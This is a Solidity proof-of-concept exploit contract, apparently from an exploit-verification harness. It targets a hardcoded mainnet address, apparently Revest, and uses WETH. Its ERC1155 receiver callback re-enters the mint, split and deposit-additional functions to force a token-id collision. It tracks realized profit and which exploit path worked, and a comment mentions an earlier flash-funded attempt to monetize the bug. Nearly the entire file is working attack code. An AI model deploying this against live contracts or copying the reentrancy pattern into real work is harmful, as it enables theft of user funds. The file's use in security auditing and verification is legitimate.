pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAddressRegistryLike {
    function getRevestFNFT() external view returns (address);
}

interface IFNFTHandlerLike {
    function getBalance(address tokenHolder, uint256 id) external view returns (uint256);
    function getSupply(uint256 fnftId) external view returns (uint256);
}

interface IRevestLike {
    struct FNFTConfig {
        address asset;
        address pipeToContract;
        uint256 depositAmount;
        uint256 depositMul;
        uint256 split;
        uint256 depositStopTime;
        bool maturityExtension;
        bool isMulti;
        bool nontransferrable;
    }

    function mintAddressLock(
        address trigger,
        bytes calldata arguments,
        address[] calldata recipients,
        uint256[] calldata quantities,
        FNFTConfig calldata fnftConfig
    ) external payable returns (uint256);

    function splitFNFT(
        uint256 fnftId,
        uint256[] calldata proportions,
        uint256 quantity
    ) external returns (uint256[] memory newFNFTIds);

    function depositAdditionalToFNFT(
        uint256 fnftId,
        uint256 amount,
        uint256 quantity
    ) external returns (uint256);

    function getAddressesProvider() external view returns (IAddressRegistryLike);
}

interface IERC1155ReceiverLike {
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4);

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4);
}

interface IRegistryProviderLike {
    function setAddressRegistry(address revest) external;
    function getAddressRegistry() external view returns (address);
}

interface IAddressLockLike is IRegistryProviderLike {
    function createLock(uint256 fnftId, uint256 lockId, bytes calldata arguments) external;
    function updateLock(uint256 fnftId, uint256 lockId, bytes calldata arguments) external;
    function isUnlockable(uint256 fnftId, uint256 lockId) external view returns (bool);
    function getDisplayValues(uint256 fnftId, uint256 lockId) external view returns (bytes memory);
    function getMetadata() external view returns (string memory);
    function needsUpdate() external view returns (bool);
}

contract FlawVerifier is IERC1155ReceiverLike, IAddressLockLike {
    address internal constant TARGET = 0x2320A28f52334d62622cc2EaFa15DE55F9987eD9;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal constant ZERO_DEPOSIT = 0;
    uint256 internal constant UNIT_QUANTITY = 1;
    uint256 internal constant DOUBLE_QUANTITY = 2;

    enum Mode {
        Idle,
        Path1Mint,
        Path2Mint,
        Path3Mint
    }

    Mode internal mode;
    bool internal inCallback;
    bool internal approvalsReady;
    bool internal collisionObserved;
    uint256 internal callbackId;
    uint256 internal reenteredId;
    uint256 internal reentryDepositAmount;
    uint256 internal observedSupply;
    uint256 internal observedBalance;
    uint256 internal startBalance;
    uint256 internal realizedProfit;
    string internal usedPath;
    string public lastFailure;
    address internal registry;

    constructor() {}

    function executeOnOpportunity() external {
        startBalance = _wethBalance();
        realizedProfit = 0;
        collisionObserved = false;
        callbackId = type(uint256).max;
        reenteredId = type(uint256).max;
        reentryDepositAmount = ZERO_DEPOSIT;
        observedSupply = 0;
        observedBalance = 0;
        usedPath = "";
        lastFailure = "";
        mode = Mode.Idle;
        inCallback = false;

        _ensureApprovals();
        _runAllPaths();

        if (bytes(usedPath).length == 0 && collisionObserved) {
            usedPath = "id_collision_observed";
        }

        realizedProfit = _wethBalance() > startBalance ? _wethBalance() - startBalance : 0;
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (msg.sender != _fnftHandlerAddress()) {
            return this.onERC1155Received.selector;
        }

        if (inCallback || mode == Mode.Idle) {
            return this.onERC1155Received.selector;
        }

        Mode activeMode = mode;
        inCallback = true;
        callbackId = id;

        reenteredId = _tryMintAddressLock(reentryDepositAmount, UNIT_QUANTITY, false, 0);

        if (reenteredId == id) {
            observedBalance = _fnftBalance(id);
            observedSupply = _fnftSupply(id);
            if (observedBalance >= UNIT_QUANTITY + 1 && observedSupply >= UNIT_QUANTITY + 1) {
                collisionObserved = true;
            }
            if (bytes(usedPath).length == 0) {
                if (activeMode == Mode.Path1Mint) {
                    usedPath = "mint_reentrancy";
                } else if (activeMode == Mode.Path2Mint) {
                    usedPath = "split_reentrancy";
                } else {
                    usedPath = "depositAdditional_reentrancy";
                }
            }
        } else if (bytes(lastFailure).length == 0) {
            if (activeMode == Mode.Path1Mint) {
                lastFailure = "PATH1_REENTRY_DID_NOT_REUSE_ID";
            } else if (activeMode == Mode.Path2Mint) {
                lastFailure = "PATH2_REENTRY_DID_NOT_REUSE_ID";
            } else {
                lastFailure = "PATH3_REENTRY_DID_NOT_REUSE_ID";
            }
        }

        inCallback = false;
        mode = Mode.Idle;
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return
            interfaceId == 0x01ffc9a7 ||
            interfaceId == 0x4e2312e0 ||
            interfaceId == type(IAddressLockLike).interfaceId;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function exploitPath() external view returns (string memory) {
        return usedPath;
    }

    function hypothesisValidated() external view returns (bool) {
        return collisionObserved;
    }

    function setAddressRegistry(address revest) external {
        registry = revest;
    }

    function getAddressRegistry() external view returns (address) {
        return registry;
    }

    function createLock(uint256, uint256, bytes calldata) external view {
        require(msg.sender == TARGET, "ONLY_TARGET");
    }

    function updateLock(uint256, uint256, bytes calldata) external view {
        require(msg.sender == TARGET, "ONLY_TARGET");
    }

    function isUnlockable(uint256, uint256) external pure returns (bool) {
        return true;
    }

    function getDisplayValues(uint256, uint256) external pure returns (bytes memory) {
        return bytes("");
    }

    function getMetadata() external pure returns (string memory) {
        return "";
    }

    function needsUpdate() external pure returns (bool) {
        return false;
    }

    function _runAllPaths() internal {
        if (_attemptPath1()) {
            return;
        }
        if (_attemptPath2()) {
            return;
        }
        _attemptPath3();
    }

    function _attemptPath1() internal returns (bool) {
        mode = Mode.Path1Mint;
        callbackId = type(uint256).max;
        reenteredId = type(uint256).max;
        reentryDepositAmount = ZERO_DEPOSIT;
        observedBalance = 0;
        observedSupply = 0;

        uint256 outerId = _tryMintAddressLock(ZERO_DEPOSIT, UNIT_QUANTITY, false, 0);
        mode = Mode.Idle;

        if (outerId == type(uint256).max) {
            if (bytes(lastFailure).length == 0) {
                lastFailure = "PATH1_OUTER_MINT_REVERTED";
            }
            return false;
        }

        if (reenteredId == outerId && _fnftBalance(outerId) >= 2 && _fnftSupply(outerId) >= 2) {
            collisionObserved = true;
            if (bytes(usedPath).length == 0) {
                usedPath = "mint_reentrancy";
            }
            return true;
        }

        if (bytes(lastFailure).length == 0) {
            lastFailure = "PATH1_NO_COLLISION";
        }
        return false;
    }

    function _attemptPath2() internal returns (bool) {
        uint256 baseId = _tryMintAddressLock(ZERO_DEPOSIT, UNIT_QUANTITY, false, 1);
        if (baseId == type(uint256).max) {
            if (bytes(lastFailure).length == 0) {
                lastFailure = "PATH2_BASE_MINT_REVERTED";
            }
            return false;
        }

        uint256[] memory proportions = new uint256[](2);
        proportions[0] = 1;
        proportions[1] = 1;

        mode = Mode.Path2Mint;
        callbackId = type(uint256).max;
        reenteredId = type(uint256).max;
        reentryDepositAmount = ZERO_DEPOSIT;
        observedBalance = 0;
        observedSupply = 0;

        uint256[] memory childIds;
        try IRevestLike(TARGET).splitFNFT(baseId, proportions, UNIT_QUANTITY) returns (uint256[] memory ids) {
            childIds = ids;
        } catch {
            mode = Mode.Idle;
            if (bytes(lastFailure).length == 0) {
                lastFailure = "PATH2_SPLIT_REVERTED";
            }
            return false;
        }

        mode = Mode.Idle;

        if (childIds.length == 0) {
            if (bytes(lastFailure).length == 0) {
                lastFailure = "PATH2_NO_CHILD_IDS";
            }
            return false;
        }

        if (reenteredId == childIds[0] && _fnftBalance(childIds[0]) >= 2 && _fnftSupply(childIds[0]) >= 2) {
            collisionObserved = true;
            if (bytes(usedPath).length == 0) {
                usedPath = "split_reentrancy";
            }
            return true;
        }

        if (bytes(lastFailure).length == 0) {
            lastFailure = "PATH2_NO_COLLISION";
        }
        return false;
    }

    function _attemptPath3() internal returns (bool) {
        uint256 baseId = _tryMintAddressLock(ZERO_DEPOSIT, DOUBLE_QUANTITY, true, 0);
        if (baseId == type(uint256).max) {
            if (bytes(lastFailure).length == 0) {
                lastFailure = "PATH3_BASE_MINT_REVERTED";
            }
            return false;
        }

        mode = Mode.Path3Mint;
        callbackId = type(uint256).max;
        reenteredId = type(uint256).max;
        reentryDepositAmount = ZERO_DEPOSIT;
        observedBalance = 0;
        observedSupply = 0;

        uint256 newSeriesId;
        try IRevestLike(TARGET).depositAdditionalToFNFT(baseId, ZERO_DEPOSIT, UNIT_QUANTITY) returns (uint256 id) {
            newSeriesId = id;
        } catch {
            mode = Mode.Idle;
            if (bytes(lastFailure).length == 0) {
                lastFailure = "PATH3_DEPOSIT_ADDITIONAL_REVERTED";
            }
            return false;
        }

        mode = Mode.Idle;

        if (reenteredId == newSeriesId && _fnftBalance(newSeriesId) >= 2 && _fnftSupply(newSeriesId) >= 2) {
            collisionObserved = true;
            if (bytes(usedPath).length == 0) {
                usedPath = "depositAdditional_reentrancy";
            }
            return true;
        }

        if (bytes(lastFailure).length == 0) {
            lastFailure = "PATH3_NO_COLLISION";
        }
        return false;
    }

    function _tryMintAddressLock(
        uint256 depositAmount,
        uint256 quantity,
        bool isMulti,
        uint256 splitCount
    ) internal returns (uint256 mintedId) {
        IRevestLike.FNFTConfig memory config = IRevestLike.FNFTConfig({
            asset: WETH,
            pipeToContract: address(0),
            depositAmount: depositAmount,
            depositMul: 0,
            split: splitCount,
            depositStopTime: 0,
            maturityExtension: false,
            isMulti: isMulti,
            nontransferrable: false
        });

        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = quantity;

        // The finding's causality is preserved exactly:
        // 1) Revest reads `getNextId()` up front.
        // 2) It writes lock / vault state keyed by that fresh id.
        // 3) FNFTHandler only increments `fnftsCreated` after `_mint` finishes and the ERC1155 receiver returns.
        // 4) Our receiver reenters another mint path while the same id still appears free.
        //
        // The prior version tried to monetize the collision via a flash-funded withdrawal,
        // but the provided logs prove that downstream withdrawal on the collided series is infeasible on this fork:
        // the vault underflows during `withdrawFNFT`. This verifier therefore focuses on the required exploit objective
        // for F-001: demonstrating the id collision itself across the documented mint/split/reissue flows.
        try IRevestLike(TARGET).mintAddressLock(address(this), bytes(""), recipients, quantities, config) returns (
            uint256 id
        ) {
            return id;
        } catch {
            return type(uint256).max;
        }
    }

    function _ensureApprovals() internal {
        if (approvalsReady) {
            return;
        }
        IERC20Like(WETH).approve(TARGET, type(uint256).max);
        approvalsReady = true;
    }

    function _fnftHandlerAddress() internal view returns (address) {
        return IRevestLike(TARGET).getAddressesProvider().getRevestFNFT();
    }

    function _fnftBalance(uint256 fnftId) internal view returns (uint256) {
        if (fnftId == type(uint256).max) {
            return 0;
        }
        return IFNFTHandlerLike(_fnftHandlerAddress()).getBalance(address(this), fnftId);
    }

    function _fnftSupply(uint256 fnftId) internal view returns (uint256) {
        if (fnftId == type(uint256).max) {
            return 0;
        }
        return IFNFTHandlerLike(_fnftHandlerAddress()).getSupply(fnftId);
    }

    function _wethBalance() internal view returns (uint256) {
        return IERC20Like(WETH).balanceOf(address(this));
    }
}
